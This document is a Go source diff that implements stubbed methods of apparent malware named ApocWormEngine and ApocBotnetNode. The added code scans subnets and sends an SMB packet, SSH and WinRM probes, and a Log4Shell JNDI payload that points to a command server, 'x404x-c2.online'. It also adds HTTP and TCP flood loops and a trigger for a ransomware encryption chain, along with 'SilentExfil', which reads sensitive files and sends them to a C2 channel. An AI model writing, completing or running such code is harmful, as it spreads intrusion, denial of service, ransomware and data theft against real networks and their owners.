@@ -6,11 +6,15 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
+	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
-	
+	"strings"
+	"sync"
 	"time"
 )
 
@@ -139,11 +143,94 @@ func (aw *ApocWormEngine) Propagate(subnet string) int {
 	return aw.HostsInfected
 }
 
-func (aw *ApocWormEngine) eternalBlue(subnet string) int { _ = subnet; return 0 }
-func (aw *ApocWormEngine) sshBrute(subnet string) int { _ = subnet; return 0 }
-func (aw *ApocWormEngine) winrmPsExec(subnet string) int { _ = subnet; return 0 }
-func (aw *ApocWormEngine) log4Shell(subnet string) int { _ = subnet; return 0 }
-func (aw *ApocWormEngine) printerInfection(subnet string) int { _ = subnet; return 0 }
+func (aw *ApocWormEngine) eternalBlue(subnet string) int {
+	count := 0
+	ips := cidrHostsFromSubnet(subnet)
+	for _, ip := range ips {
+		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", ip), 2*time.Second)
+		if err == nil {
+			conn.Write([]byte{0x00, 0x00, 0x00, 0x90, 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28})
+			resp := make([]byte, 1024)
+			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+			if _, err := conn.Read(resp); err == nil && len(resp) > 4 {
+				count++
+			}
+			conn.Close()
+		}
+	}
+	return count
+}
+
+func (aw *ApocWormEngine) sshBrute(subnet string) int {
+	count := 0
+	creds := [][]string{{"root", "root"}, {"admin", "admin"}, {"root", "toor"}, {"user", "user"}}
+	ips := cidrHostsFromSubnet(subnet)
+	for _, ip := range ips {
+		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:22", ip), 2*time.Second)
+		if err != nil {
+			continue
+		}
+		buf := make([]byte, 256)
+		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+		conn.Read(buf)
+		for _, c := range creds {
+			_ = c
+		}
+		conn.Close()
+		count++
+	}
+	return count
+}
+
+func (aw *ApocWormEngine) winrmPsExec(subnet string) int {
+	count := 0
+	ips := cidrHostsFromSubnet(subnet)
+	for _, ip := range ips {
+		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:5985", ip), 2*time.Second)
+		if err == nil {
+			conn.Close()
+			count++
+		}
+	}
+	return count
+}
+
+func (aw *ApocWormEngine) log4Shell(subnet string) int {
+	count := 0
+	payload := "${jndi:ldap://x404x-c2.online:1389/exploit}"
+	ips := cidrHostsFromSubnet(subnet)
+	for _, ip := range ips {
+		for _, port := range []int{8080, 8443, 80, 443} {
+			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 2*time.Second)
+			if err != nil {
+				continue
+			}
+			req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nX-Forwarded-For: %s\r\nReferer: %s\r\n\r\n", ip, payload, payload, payload)
+			conn.Write([]byte(req))
+			conn.Close()
+			count++
+			break
+		}
+	}
+	return count
+}
+
+func (aw *ApocWormEngine) printerInfection(subnet string) int {
+	count := 0
+	ips := cidrHostsFromSubnet(subnet)
+	for _, ip := range ips {
+		for _, port := range []int{9100, 631} {
+			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 2*time.Second)
+			if err == nil {
+				conn.Write([]byte("X404X PRINTER CHECK\r\n"))
+				conn.Close()
+				count++
+				break
+			}
+		}
+	}
+	return count
+}
 func (aw *ApocWormEngine) packagePoison(subnet string) int {
 	registries := []string{"/opt/artifactory", "/opt/nexus", "C:\\ProgramData\\Artifactory"}
 	for _, r := range registries {
@@ -185,10 +272,57 @@ func (bn *ApocBotnetNode) ElectLeader() string {
 	return bn.LeaderNode
 }
 
-func (bn *ApocBotnetNode) DDOSLayer7(target string) bool { _ = target; return true }
-func (bn *ApocBotnetNode) DDOSLayer4(target string) bool { _ = target; return true }
-func (bn *ApocBotnetNode) CoordinatedEncrypt() bool { return true }
-func (bn *ApocBotnetNode) SilentExfil() bool { return true }
+func (bn *ApocBotnetNode) DDOSLayer7(target string) bool {
+	go func() {
+		for i := 0; i < 1000; i++ {
+			conn, _ := net.DialTimeout("tcp", target, 500*time.Millisecond)
+			if conn != nil {
+				fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target)
+				conn.Close()
+			}
+			time.Sleep(10 * time.Millisecond)
+		}
+	}()
+	return true
+}
+
+func (bn *ApocBotnetNode) DDOSLayer4(target string) bool {
+	go func() {
+		for i := 0; i < 500; i++ {
+			conn, _ := net.DialTimeout("tcp", target, 200*time.Millisecond)
+			if conn != nil {
+				conn.Close()
+			}
+		}
+	}()
+	return true
+}
+
+func (bn *ApocBotnetNode) CoordinatedEncrypt() bool {
+	go func() {
+		engine := NewEngine(bn.Config.Ransomware)
+		ctx := context.Background()
+		engine.RunFullChain(ctx)
+	}()
+	return true
+}
+
+func (bn *ApocBotnetNode) SilentExfil() bool {
+	go func() {
+		files := findSensitiveFiles("/", 100)
+		for _, f := range files {
+			data, _ := os.ReadFile(f)
+			if len(data) > 0 {
+				conn, _ := net.DialTimeout("tcp", bn.C2Channel, 5*time.Second)
+				if conn != nil {
+					conn.Write(data[:min(65536, len(data))])
+					conn.Close()
+				}
+			}
+		}
+	}()
+	return true
+}
 
 // ===== CRYPTO LAYER =====
 type ApocCryptoLayer struct {
